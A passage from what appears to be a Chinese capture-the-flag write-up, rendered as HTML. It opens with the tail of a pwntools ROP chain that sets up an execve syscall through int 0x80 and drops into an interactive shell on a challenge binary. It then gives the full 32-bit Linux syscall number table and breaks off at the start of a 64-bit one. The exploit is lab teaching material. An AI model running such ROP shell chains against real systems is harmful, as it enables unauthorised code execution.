mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806eb6a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08054590) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a4ad) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806eb91) # pop ecx ; pop ebx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # padding without overwrite ebx</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806eb6a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08054590) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b5bf) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b5bf) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b5bf) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b5bf) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b5bf) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b5bf) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b5bf) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b5bf) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b5bf) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b5bf) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b5bf) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08049421) # int 0x80</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h5 id="解法二-系统调用-："><a href="#解法二-系统调用-：" class="headerlink" title="解法二(系统调用)："></a>解法二(系统调用)：</h5><p>一般如果看到沙盒或者出现syscall可以考虑使用这种攻击手法</p>
<h6 id="附-linux-系统调用号表"><a href="#附-linux-系统调用号表" class="headerlink" title="附 linux 系统调用号表"></a>附 linux 系统调用号表</h6><p>32位:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br></pre></td><td class="code"><pre><span class="line">#ifndef _ASM_X86_UNISTD_32_H</span><br><span class="line">#define _ASM_X86_UNISTD_32_H 1</span><br><span class="line"></span><br><span class="line">#define __NR_restart_syscall 0</span><br><span class="line">#define __NR_exit 1</span><br><span class="line">#define __NR_fork 2</span><br><span class="line">#define __NR_read 3</span><br><span class="line">#define __NR_write 4</span><br><span class="line">#define __NR_open 5</span><br><span class="line">#define __NR_close 6</span><br><span class="line">#define __NR_waitpid 7</span><br><span class="line">#define __NR_creat 8</span><br><span class="line">#define __NR_link 9</span><br><span class="line">#define __NR_unlink 10</span><br><span class="line">#define __NR_execve 11</span><br><span class="line">#define __NR_chdir 12</span><br><span class="line">#define __NR_time 13</span><br><span class="line">#define __NR_mknod 14</span><br><span class="line">#define __NR_chmod 15</span><br><span class="line">#define __NR_lchown 16</span><br><span class="line">#define __NR_break 17</span><br><span class="line">#define __NR_oldstat 18</span><br><span class="line">#define __NR_lseek 19</span><br><span class="line">#define __NR_getpid 20</span><br><span class="line">#define __NR_mount 21</span><br><span class="line">#define __NR_umount 22</span><br><span class="line">#define __NR_setuid 23</span><br><span class="line">#define __NR_getuid 24</span><br><span class="line">#define __NR_stime 25</span><br><span class="line">#define __NR_ptrace 26</span><br><span class="line">#define __NR_alarm 27</span><br><span class="line">#define __NR_oldfstat 28</span><br><span class="line">#define __NR_pause 29</span><br><span class="line">#define __NR_utime 30</span><br><span class="line">#define __NR_stty 31</span><br><span class="line">#define __NR_gtty 32</span><br><span class="line">#define __NR_access 33</span><br><span class="line">#define __NR_nice 34</span><br><span class="line">#define __NR_ftime 35</span><br><span class="line">#define __NR_sync 36</span><br><span class="line">#define __NR_kill 37</span><br><span class="line">#define __NR_rename 38</span><br><span class="line">#define __NR_mkdir 39</span><br><span class="line">#define __NR_rmdir 40</span><br><span class="line">#define __NR_dup 41</span><br><span class="line">#define __NR_pipe 42</span><br><span class="line">#define __NR_times 43</span><br><span class="line">#define __NR_prof 44</span><br><span class="line">#define __NR_brk 45</span><br><span class="line">#define __NR_setgid 46</span><br><span class="line">#define __NR_getgid 47</span><br><span class="line">#define __NR_signal 48</span><br><span class="line">#define __NR_geteuid 49</span><br><span class="line">#define __NR_getegid 50</span><br><span class="line">#define __NR_acct 51</span><br><span class="line">#define __NR_umount2 52</span><br><span class="line">#define __NR_lock 53</span><br><span class="line">#define __NR_ioctl 54</span><br><span class="line">#define __NR_fcntl 55</span><br><span class="line">#define __NR_mpx 56</span><br><span class="line">#define __NR_setpgid 57</span><br><span class="line">#define __NR_ulimit 58</span><br><span class="line">#define __NR_oldolduname 59</span><br><span class="line">#define __NR_umask 60</span><br><span class="line">#define __NR_chroot 61</span><br><span class="line">#define __NR_ustat 62</span><br><span class="line">#define __NR_dup2 63</span><br><span class="line">#define __NR_getppid 64</span><br><span class="line">#define __NR_getpgrp 65</span><br><span class="line">#define __NR_setsid 66</span><br><span class="line">#define __NR_sigaction 67</span><br><span class="line">#define __NR_sgetmask 68</span><br><span class="line">#define __NR_ssetmask 69</span><br><span class="line">#define __NR_setreuid 70</span><br><span class="line">#define __NR_setregid 71</span><br><span class="line">#define __NR_sigsuspend 72</span><br><span class="line">#define __NR_sigpending 73</span><br><span class="line">#define __NR_sethostname 74</span><br><span class="line">#define __NR_setrlimit 75</span><br><span class="line">#define __NR_getrlimit 76</span><br><span class="line">#define __NR_getrusage 77</span><br><span class="line">#define __NR_gettimeofday 78</span><br><span class="line">#define __NR_settimeofday 79</span><br><span class="line">#define __NR_getgroups 80</span><br><span class="line">#define __NR_setgroups 81</span><br><span class="line">#define __NR_select 82</span><br><span class="line">#define __NR_symlink 83</span><br><span class="line">#define __NR_oldlstat 84</span><br><span class="line">#define __NR_readlink 85</span><br><span class="line">#define __NR_uselib 86</span><br><span class="line">#define __NR_swapon 87</span><br><span class="line">#define __NR_reboot 88</span><br><span class="line">#define __NR_readdir 89</span><br><span class="line">#define __NR_mmap 90</span><br><span class="line">#define __NR_munmap 91</span><br><span class="line">#define __NR_truncate 92</span><br><span class="line">#define __NR_ftruncate 93</span><br><span class="line">#define __NR_fchmod 94</span><br><span class="line">#define __NR_fchown 95</span><br><span class="line">#define __NR_getpriority 96</span><br><span class="line">#define __NR_setpriority 97</span><br><span class="line">#define __NR_profil 98</span><br><span class="line">#define __NR_statfs 99</span><br><span class="line">#define __NR_fstatfs 100</span><br><span class="line">#define __NR_ioperm 101</span><br><span class="line">#define __NR_socketcall 102</span><br><span class="line">#define __NR_syslog 103</span><br><span class="line">#define __NR_setitimer 104</span><br><span class="line">#define __NR_getitimer 105</span><br><span class="line">#define __NR_stat 106</span><br><span class="line">#define __NR_lstat 107</span><br><span class="line">#define __NR_fstat 108</span><br><span class="line">#define __NR_olduname 109</span><br><span class="line">#define __NR_iopl 110</span><br><span class="line">#define __NR_vhangup 111</span><br><span class="line">#define __NR_idle 112</span><br><span class="line">#define __NR_vm86old 113</span><br><span class="line">#define __NR_wait4 114</span><br><span class="line">#define __NR_swapoff 115</span><br><span class="line">#define __NR_sysinfo 116</span><br><span class="line">#define __NR_ipc 117</span><br><span class="line">#define __NR_fsync 118</span><br><span class="line">#define __NR_sigreturn 119</span><br><span class="line">#define __NR_clone 120</span><br><span class="line">#define __NR_setdomainname 121</span><br><span class="line">#define __NR_uname 122</span><br><span class="line">#define __NR_modify_ldt 123</span><br><span class="line">#define __NR_adjtimex 124</span><br><span class="line">#define __NR_mprotect 125</span><br><span class="line">#define __NR_sigprocmask 126</span><br><span class="line">#define __NR_create_module 127</span><br><span class="line">#define __NR_init_module 128</span><br><span class="line">#define __NR_delete_module 129</span><br><span class="line">#define __NR_get_kernel_syms 130</span><br><span class="line">#define __NR_quotactl 131</span><br><span class="line">#define __NR_getpgid 132</span><br><span class="line">#define __NR_fchdir 133</span><br><span class="line">#define __NR_bdflush 134</span><br><span class="line">#define __NR_sysfs 135</span><br><span class="line">#define __NR_personality 136</span><br><span class="line">#define __NR_afs_syscall 137</span><br><span class="line">#define __NR_setfsuid 138</span><br><span class="line">#define __NR_setfsgid 139</span><br><span class="line">#define __NR__llseek 140</span><br><span class="line">#define __NR_getdents 141</span><br><span class="line">#define __NR__newselect 142</span><br><span class="line">#define __NR_flock 143</span><br><span class="line">#define __NR_msync 144</span><br><span class="line">#define __NR_readv 145</span><br><span class="line">#define __NR_writev 146</span><br><span class="line">#define __NR_getsid 147</span><br><span class="line">#define __NR_fdatasync 148</span><br><span class="line">#define __NR__sysctl 149</span><br><span class="line">#define __NR_mlock 150</span><br><span class="line">#define __NR_munlock 151</span><br><span class="line">#define __NR_mlockall 152</span><br><span class="line">#define __NR_munlockall 153</span><br><span class="line">#define __NR_sched_setparam 154</span><br><span class="line">#define __NR_sched_getparam 155</span><br><span class="line">#define __NR_sched_setscheduler 156</span><br><span class="line">#define __NR_sched_getscheduler 157</span><br><span class="line">#define __NR_sched_yield 158</span><br><span class="line">#define __NR_sched_get_priority_max 159</span><br><span class="line">#define __NR_sched_get_priority_min 160</span><br><span class="line">#define __NR_sched_rr_get_interval 161</span><br><span class="line">#define __NR_nanosleep 162</span><br><span class="line">#define __NR_mremap 163</span><br><span class="line">#define __NR_setresuid 164</span><br><span class="line">#define __NR_getresuid 165</span><br><span class="line">#define __NR_vm86 166</span><br><span class="line">#define __NR_query_module 167</span><br><span class="line">#define __NR_poll 168</span><br><span class="line">#define __NR_nfsservctl 169</span><br><span class="line">#define __NR_setresgid 170</span><br><span class="line">#define __NR_getresgid 171</span><br><span class="line">#define __NR_prctl 172</span><br><span class="line">#define __NR_rt_sigreturn 173</span><br><span class="line">#define __NR_rt_sigaction 174</span><br><span class="line">#define __NR_rt_sigprocmask 175</span><br><span class="line">#define __NR_rt_sigpending 176</span><br><span class="line">#define __NR_rt_sigtimedwait 177</span><br><span class="line">#define __NR_rt_sigqueueinfo 178</span><br><span class="line">#define __NR_rt_sigsuspend 179</span><br><span class="line">#define __NR_pread64 180</span><br><span class="line">#define __NR_pwrite64 181</span><br><span class="line">#define __NR_chown 182</span><br><span class="line">#define __NR_getcwd 183</span><br><span class="line">#define __NR_capget 184</span><br><span class="line">#define __NR_capset 185</span><br><span class="line">#define __NR_sigaltstack 186</span><br><span class="line">#define __NR_sendfile 187</span><br><span class="line">#define __NR_getpmsg 188</span><br><span class="line">#define __NR_putpmsg 189</span><br><span class="line">#define __NR_vfork 190</span><br><span class="line">#define __NR_ugetrlimit 191</span><br><span class="line">#define __NR_mmap2 192</span><br><span class="line">#define __NR_truncate64 193</span><br><span class="line">#define __NR_ftruncate64 194</span><br><span class="line">#define __NR_stat64 195</span><br><span class="line">#define __NR_lstat64 196</span><br><span class="line">#define __NR_fstat64 197</span><br><span class="line">#define __NR_lchown32 198</span><br><span class="line">#define __NR_getuid32 199</span><br><span class="line">#define __NR_getgid32 200</span><br><span class="line">#define __NR_geteuid32 201</span><br><span class="line">#define __NR_getegid32 202</span><br><span class="line">#define __NR_setreuid32 203</span><br><span class="line">#define __NR_setregid32 204</span><br><span class="line">#define __NR_getgroups32 205</span><br><span class="line">#define __NR_setgroups32 206</span><br><span class="line">#define __NR_fchown32 207</span><br><span class="line">#define __NR_setresuid32 208</span><br><span class="line">#define __NR_getresuid32 209</span><br><span class="line">#define __NR_setresgid32 210</span><br><span class="line">#define __NR_getresgid32 211</span><br><span class="line">#define __NR_chown32 212</span><br><span class="line">#define __NR_setuid32 213</span><br><span class="line">#define __NR_setgid32 214</span><br><span class="line">#define __NR_setfsuid32 215</span><br><span class="line">#define __NR_setfsgid32 216</span><br><span class="line">#define __NR_pivot_root 217</span><br><span class="line">#define __NR_mincore 218</span><br><span class="line">#define __NR_madvise 219</span><br><span class="line">#define __NR_getdents64 220</span><br><span class="line">#define __NR_fcntl64 221</span><br><span class="line">#define __NR_gettid 224</span><br><span class="line">#define __NR_readahead 225</span><br><span class="line">#define __NR_setxattr 226</span><br><span class="line">#define __NR_lsetxattr 227</span><br><span class="line">#define __NR_fsetxattr 228</span><br><span class="line">#define __NR_getxattr 229</span><br><span class="line">#define __NR_lgetxattr 230</span><br><span class="line">#define __NR_fgetxattr 231</span><br><span class="line">#define __NR_listxattr 232</span><br><span class="line">#define __NR_llistxattr 233</span><br><span class="line">#define __NR_flistxattr 234</span><br><span class="line">#define __NR_removexattr 235</span><br><span class="line">#define __NR_lremovexattr 236</span><br><span class="line">#define __NR_fremovexattr 237</span><br><span class="line">#define __NR_tkill 238</span><br><span class="line">#define __NR_sendfile64 239</span><br><span class="line">#define __NR_futex 240</span><br><span class="line">#define __NR_sched_setaffinity 241</span><br><span class="line">#define __NR_sched_getaffinity 242</span><br><span class="line">#define __NR_set_thread_area 243</span><br><span class="line">#define __NR_get_thread_area 244</span><br><span class="line">#define __NR_io_setup 245</span><br><span class="line">#define __NR_io_destroy 246</span><br><span class="line">#define __NR_io_getevents 247</span><br><span class="line">#define __NR_io_submit 248</span><br><span class="line">#define __NR_io_cancel 249</span><br><span class="line">#define __NR_fadvise64 250</span><br><span class="line">#define __NR_exit_group 252</span><br><span class="line">#define __NR_lookup_dcookie 253</span><br><span class="line">#define __NR_epoll_create 254</span><br><span class="line">#define __NR_epoll_ctl 255</span><br><span class="line">#define __NR_epoll_wait 256</span><br><span class="line">#define __NR_remap_file_pages 257</span><br><span class="line">#define __NR_set_tid_address 258</span><br><span class="line">#define __NR_timer_create 259</span><br><span class="line">#define __NR_timer_settime 260</span><br><span class="line">#define __NR_timer_gettime 261</span><br><span class="line">#define __NR_timer_getoverrun 262</span><br><span class="line">#define __NR_timer_delete 263</span><br><span class="line">#define __NR_clock_settime 264</span><br><span class="line">#define __NR_clock_gettime 265</span><br><span class="line">#define __NR_clock_getres 266</span><br><span class="line">#define __NR_clock_nanosleep 267</span><br><span class="line">#define __NR_statfs64 268</span><br><span class="line">#define __NR_fstatfs64 269</span><br><span class="line">#define __NR_tgkill 270</span><br><span class="line">#define __NR_utimes 271</span><br><span class="line">#define __NR_fadvise64_64 272</span><br><span class="line">#define __NR_vserver 273</span><br><span class="line">#define __NR_mbind 274</span><br><span class="line">#define __NR_get_mempolicy 275</span><br><span class="line">#define __NR_set_mempolicy 276</span><br><span class="line">#define __NR_mq_open 277</span><br><span class="line">#define __NR_mq_unlink 278</span><br><span class="line">#define __NR_mq_timedsend 279</span><br><span class="line">#define __NR_mq_timedreceive 280</span><br><span class="line">#define __NR_mq_notify 281</span><br><span class="line">#define __NR_mq_getsetattr 282</span><br><span class="line">#define __NR_kexec_load 283</span><br><span class="line">#define __NR_waitid 284</span><br><span class="line">#define __NR_add_key 286</span><br><span class="line">#define __NR_request_key 287</span><br><span class="line">#define __NR_keyctl 288</span><br><span class="line">#define __NR_ioprio_set 289</span><br><span class="line">#define __NR_ioprio_get 290</span><br><span class="line">#define __NR_inotify_init 291</span><br><span class="line">#define __NR_inotify_add_watch 292</span><br><span class="line">#define __NR_inotify_rm_watch 293</span><br><span class="line">#define __NR_migrate_pages 294</span><br><span class="line">#define __NR_openat 295</span><br><span class="line">#define __NR_mkdirat 296</span><br><span class="line">#define __NR_mknodat 297</span><br><span class="line">#define __NR_fchownat 298</span><br><span class="line">#define __NR_futimesat 299</span><br><span class="line">#define __NR_fstatat64 300</span><br><span class="line">#define __NR_unlinkat 301</span><br><span class="line">#define __NR_renameat 302</span><br><span class="line">#define __NR_linkat 303</span><br><span class="line">#define __NR_symlinkat 304</span><br><span class="line">#define __NR_readlinkat 305</span><br><span class="line">#define __NR_fchmodat 306</span><br><span class="line">#define __NR_faccessat 307</span><br><span class="line">#define __NR_pselect6 308</span><br><span class="line">#define __NR_ppoll 309</span><br><span class="line">#define __NR_unshare 310</span><br><span class="line">#define __NR_set_robust_list 311</span><br><span class="line">#define __NR_get_robust_list 312</span><br><span class="line">#define __NR_splice 313</span><br><span class="line">#define __NR_sync_file_range 314</span><br><span class="line">#define __NR_tee 315</span><br><span class="line">#define __NR_vmsplice 316</span><br><span class="line">#define __NR_move_pages 317</span><br><span class="line">#define __NR_getcpu 318</span><br><span class="line">#define __NR_epoll_pwait 319</span><br><span class="line">#define __NR_utimensat 320</span><br><span class="line">#define __NR_signalfd 321</span><br><span class="line">#define __NR_timerfd_create 322</span><br><span class="line">#define __NR_eventfd 323</span><br><span class="line">#define __NR_fallocate 324</span><br><span class="line">#define __NR_timerfd_settime 325</span><br><span class="line">#define __NR_timerfd_gettime 326</span><br><span class="line">#define __NR_signalfd4 327</span><br><span class="line">#define __NR_eventfd2 328</span><br><span class="line">#define __NR_epoll_create1 329</span><br><span class="line">#define __NR_dup3 330</span><br><span class="line">#define __NR_pipe2 331</span><br><span class="line">#define __NR_inotify_init1 332</span><br><span class="line">#define __NR_preadv 333</span><br><span class="line">#define __NR_pwritev 334</span><br><span class="line">#define __NR_rt_tgsigqueueinfo 335</span><br><span class="line">#define __NR_perf_event_open 336</span><br><span class="line">#define __NR_recvmmsg 337</span><br><span class="line">#define __NR_fanotify_init 338</span><br><span class="line">#define __NR_fanotify_mark 339</span><br><span class="line">#define __NR_prlimit64 340</span><br><span class="line">#define __NR_name_to_handle_at 341</span><br><span class="line">#define __NR_open_by_handle_at 342</span><br><span class="line">#define __NR_clock_adjtime 343</span><br><span class="line">#define __NR_syncfs 344</span><br><span class="line">#define __NR_sendmmsg 345</span><br><span class="line">#define __NR_setns 346</span><br><span class="line">#define __NR_process_vm_readv 347</span><br><span class="line">#define __NR_process_vm_writev 348</span><br><span class="line">#define __NR_kcmp 349</span><br><span class="line">#define __NR_finit_module 350</span><br><span class="line">#define __NR_sched_setattr 351</span><br><span class="line">#define __NR_sched_getattr 352</span><br><span class="line">#define __NR_renameat2 353</span><br><span class="line">#define __NR_seccomp 354</span><br><span class="line">#define __NR_getrandom 355</span><br><span class="line">#define __NR_memfd_create 356</span><br><span class="line">#define __NR_bpf 357</span><br><span class="line">#define __NR_execveat 358</span><br><span class="line">#define __NR_socket 359</span><br><span class="line">#define __NR_socketpair 360</span><br><span class="line">#define __NR_bind 361</span><br><span class="line">#define __NR_connect 362</span><br><span class="line">#define __NR_listen 363</span><br><span class="line">#define __NR_accept4 364</span><br><span class="line">#define __NR_getsockopt 365</span><br><span class="line">#define __NR_setsockopt 366</span><br><span class="line">#define __NR_getsockname 367</span><br><span class="line">#define __NR_getpeername 368</span><br><span class="line">#define __NR_sendto 369</span><br><span class="line">#define __NR_sendmsg 370</span><br><span class="line">#define __NR_recvfrom 371</span><br><span class="line">#define __NR_recvmsg 372</span><br><span class="line">#define __NR_shutdown 373</span><br><span class="line">#define __NR_userfaultfd 374</span><br><span class="line">#define __NR_membarrier 375</span><br><span class="line">#define __NR_mlock2 376</span><br><span class="line">#define __NR_copy_file_range 377</span><br><span class="line">#define __NR_preadv2 378</span><br><span class="line">#define __NR_pwritev2 379</span><br><span class="line"></span><br><span class="line">#endif /* _ASM_X86_UNISTD_32_H */</span><br></pre></td></tr></table></figure>

<p>64:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 